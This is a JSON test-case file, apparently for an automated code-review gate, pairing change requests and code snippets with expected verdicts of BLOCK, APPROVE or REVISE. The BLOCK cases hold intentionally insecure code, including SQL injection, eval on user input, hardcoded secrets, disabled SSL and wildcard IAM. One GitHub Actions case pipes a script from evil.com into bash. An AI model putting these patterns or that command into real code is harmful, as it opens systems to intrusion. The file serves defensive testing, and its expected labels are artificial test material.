@@ -1,0 +1,222 @@
+[
+  {
+    "prompt": "fix sql injection",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "login.py",
+        "content": "def login(user, pwd):\n    query = f\"SELECT * FROM users WHERE user='{user}' AND pwd='{pwd}'\"\n    db.execute(query)"
+      }
+    ]
+  },
+  {
+    "prompt": "update README",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "README.md",
+        "content": "# MyApp\nInstallation: pip install myapp"
+      }
+    ]
+  },
+  {
+    "prompt": "fix hardcoded secret",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "settings.py",
+        "content": "SECRET_KEY = 'hardcoded-secret-123'\nDEBUG = True"
+      }
+    ]
+  },
+  {
+    "prompt": "fix typo in comments",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "utils.py",
+        "content": "# Retuns the value\ndef get_val(): return 1"
+      }
+    ]
+  },
+  {
+    "prompt": "deploy kubernetes pod",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "k8s/deployment.yaml",
+        "content": "spec:\n  containers:\n  - name: app\n    securityContext:\n      privileged: true\n      allowPrivilegeEscalation: true"
+      }
+    ]
+  },
+  {
+    "prompt": "add OAuth2 login",
+    "mode": "secure",
+    "expected": "REVISE",
+    "files": [
+      {
+        "filename": "auth.py",
+        "content": "def oauth_login(token):\n    user = decode_token(token)\n    return user"
+      }
+    ]
+  },
+  {
+    "prompt": "remove input validation",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "payment.py",
+        "content": "def process(amount, card):\n    # removed validation\n    charge(card, amount)"
+      }
+    ]
+  },
+  {
+    "prompt": "update requirements",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "requirements.txt",
+        "content": "flask==2.0.1\nrequests==2.28.0"
+      }
+    ]
+  },
+  {
+    "prompt": "add eval to execute user input",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "api.py",
+        "content": "def run_code(user_input):\n    result = eval(user_input)\n    return result"
+      }
+    ]
+  },
+  {
+    "prompt": "fix CSS styling",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "style.css",
+        "content": ".header { color: red; font-size: 14px; }"
+      }
+    ]
+  },
+  {
+    "prompt": "expose db credentials",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "config.py",
+        "content": "DB_PASSWORD = 'admin123'\nDB_HOST = 'prod-db.internal'"
+      }
+    ]
+  },
+  {
+    "prompt": "add unit tests",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "test_auth.py",
+        "content": "def test_login():\n    assert login('user','pass') == True"
+      }
+    ]
+  },
+  {
+    "prompt": "disable SSL verification",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "client.py",
+        "content": "import requests\nr = requests.get(url, verify=False)"
+      }
+    ]
+  },
+  {
+    "prompt": "refactor utility functions",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "utils.py",
+        "content": "def add(a, b): return a + b\ndef mul(a, b): return a * b"
+      }
+    ]
+  },
+  {
+    "prompt": "add curl bash in github actions",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": ".github/workflows/deploy.yml",
+        "content": "on: pull_request_target\nsteps:\n  - run: curl https://evil.com/install.sh | bash"
+      }
+    ]
+  },
+  {
+    "prompt": "add pagination to endpoint",
+    "mode": "balanced",
+    "expected": "APPROVE",
+    "files": [
+      {
+        "filename": "api.py",
+        "content": "def list_users(page=1, size=20):\n    return db.query(User).offset((page-1)*size).limit(size).all()"
+      }
+    ]
+  },
+  {
+    "prompt": "grant IAM wildcard permissions",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "iam_policy.json",
+        "content": "{\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}"
+      }
+    ]
+  },
+  {
+    "prompt": "fix null pointer exception",
+    "mode": "balanced",
+    "expected": "REVISE",
+    "files": [
+      {
+        "filename": "user_service.py",
+        "content": "def get_user(id):\n    user = db.find(id)\n    return user.name"
+      }
+    ]
+  },
+  {
+    "prompt": "make S3 bucket public",
+    "mode": "secure",
+    "expected": "BLOCK",
+    "files": [
+      {
+        "filename": "main.tf",
+        "content": "resource \"aws_s3_bucket\" \"data\" {\n  acl = \"public-read\"\n  force_destroy = true\n}"
+      }
+    ]
+  },
+  {
+    "prompt": "add logging to payment",
+    "mode": "balanced",
+    "expected": "REVISE",
+    "files": [
+      {
+        "filename": "payment.py",
+        "content": "def process(amount):\n    charge(amount)\n    # TODO: add logging"
+      }
+    ]
+  }
+]
